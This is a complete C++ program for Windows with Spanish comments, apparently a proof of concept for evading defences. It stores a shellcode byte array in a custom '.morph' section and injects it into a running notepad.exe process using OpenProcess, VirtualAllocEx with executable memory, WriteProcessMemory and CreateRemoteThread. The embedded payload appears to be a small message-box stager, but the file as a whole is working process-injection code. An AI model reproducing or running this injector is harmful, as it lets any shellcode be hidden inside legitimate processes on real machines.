#include <iostream>
#include <windows.h>
#include <tlhelp32.h>
#include <string>
#include <vector>

// 🎯 SOLUCIÓN 1: Usar la sintaxis de atributos de GCC para colocar el shellcode en la sección ".morph".
// Esto reemplaza las directivas #pragma y __declspec que son específicas de MSVC.
const unsigned char shellcode[] __attribute__((section(".morph"))) =
    "\xFC\x48\x83\xE4\xF0\xE8\xC0\x00\x00\x00\x41\x51\x41\x50\x52\x51"
    "\x56\x48\x31\xD2\x65\x48\x8B\x52\x60\x48\x8B\x52\x18\x48\x8B\x52"
    "\x20\x48\x8B\x72\x50\x48\x0F\xB7\x4A\x4A\x4D\x31\xC9\x48\x31\xC0"
    "\xAC\x3C\x61\x7C\x02\x2C\x20\x41\xC1\xC9\x0D\x41\x01\xC1\xE2\xED"
    "\x52\x41\x51\x48\x8B\x52\x20\x8B\x42\x3C\x48\x01\xD0\x8B\x80\x88"
    "\x00\x00\x00\x48\x85\xC0\x74\x67\x48\x01\xD0\x50\x8B\x48\x18\x44"
    "\x8B\x40\x20\x49\x01\xD0\xE3\x56\x48\xFF\xC9\x41\x8B\x34\x88\x48"
    "\x01\xD6\x4D\x31\xC9\x48\x31\xC0\xAC\x41\xC1\xC9\x0D\x41\x01\xC1"
    "\x38\xE0\x75\xF1\x4C\x03\x4C\x24\x08\x45\x39\xD1\x75\xD8\x58\x44"
    "\x8B\x40\x24\x49\x01\xD0\x66\x41\x8B\x0C\x48\x44\x8B\x40\x1C\x49"
    "\x01\xD0\x41\x8B\x04\x88\x48\x01\xD0\x41\x58\x41\x58\x5E\x59\x5A"
    "\x41\x58\x41\x59\x41\x5A\x48\x83\xEC\x20\x41\x52\xFF\xE0\x58\x41"
    "\x59\x5A\x48\x8B\x12\xE9\x57\xFF\xFF\xFF\x5D\x48\xBA\x01\x00\x00"
    "\x00\x00\x00\x00\x00\x48\x8D\x8D\x01\x01\x00\x00\x41\xBA\x31\x8B"
    "\x6F\x87\xFF\xD5\xBB\xF0\xB5\xA2\x56\x41\xBA\xA6\x95\xBD\x9D\xFF"
    "\xD5\x48\x83\xC4\x28\x3C\x06\x7C\x0A\x80\xFB\xE0\x75\x05\xBB\x47"
    "\x13\x72\x6F\x6A\x00\x59\x41\x89\xDA\xFF\xD5\x53\x79\x6E\x74\x68"
    "\x45\x76\x61\x73\x69\x6F\x6E\x00\x50\x4F\x43\x00";

DWORD GetProcessIdByName(const std::wstring& processName);

int main() {
    size_t shellcodeSize = sizeof(shellcode);
    std::wcout << L"[*] Shellcode localizado en la sección .morph. Tamaño: " << shellcodeSize << " bytes." << std::endl;
    std::wstring targetProcessName = L"notepad.exe";
    DWORD pid = GetProcessIdByName(targetProcessName);

    if (pid == 0) {
        std::wcerr << L"Error: No se pudo encontrar el proceso '" << targetProcessName << L"'. Asegúrate de que está en ejecución." << std::endl;
        return 1;
    }
    std::wcout << L"[*] Proceso objetivo encontrado: " << targetProcessName << L" (PID: " << pid << L")" << std::endl;

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess == NULL) {
        std::cerr << "Error: OpenProcess falló. Código de error: " << GetLastError() << std::endl;
        return 1;
    }
    std::cout << "[*] Handle al proceso obtenido: " << hProcess << std::endl;

    LPVOID pRemoteBuffer = VirtualAllocEx(hProcess, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (pRemoteBuffer == NULL) {
        std::cerr << "Error: VirtualAllocEx falló. Código de error: " << GetLastError() << std::endl;
        CloseHandle(hProcess);
        return 1;
    }
    std::cout << "[*] Memoria asignada en el proceso remoto en la dirección: 0x" << std::hex << pRemoteBuffer << std::dec << std::endl;

    if (!WriteProcessMemory(hProcess, pRemoteBuffer, shellcode, shellcodeSize, NULL)) {
        std::cerr << "Error: WriteProcessMemory falló. Código de error: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, pRemoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }
    std::cout << "[*] Shellcode escrito exitosamente en el proceso remoto." << std::endl;

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteBuffer, NULL, 0, NULL);
    if (hThread == NULL) {
        std::cerr << "Error: CreateRemoteThread falló. Código de error: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, pRemoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }
    std::cout << "[+] ¡Inyección exitosa! Hilo remoto creado." << std::endl;
    CloseHandle(hThread);
    CloseHandle(hProcess);
    return 0;
}

DWORD GetProcessIdByName(const std::wstring& processName) {
    // 🎯 SOLUCIÓN 2: Usar explícitamente la estructura Unicode (Wide)
    PROCESSENTRY32W entry;
    entry.dwSize = sizeof(PROCESSENTRY32W);

    // 🎯 SOLUCIÓN 3: Usar 0 en lugar de NULL para el argumento de tipo DWORD
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }

    // Usar la versión Unicode de la función
    if (Process32FirstW(snapshot, &entry) == TRUE) {
        // Usar la versión Unicode de la función
        while (Process32NextW(snapshot, &entry) == TRUE) {
            // Ahora 'entry.szExeFile' es de tipo WCHAR[], que es compatible con _wcsicmp
            if (_wcsicmp(entry.szExeFile, processName.c_str()) == 0) {
                CloseHandle(snapshot);
                return entry.th32ProcessID;
            }
        }
    }

    CloseHandle(snapshot);
    return 0;
}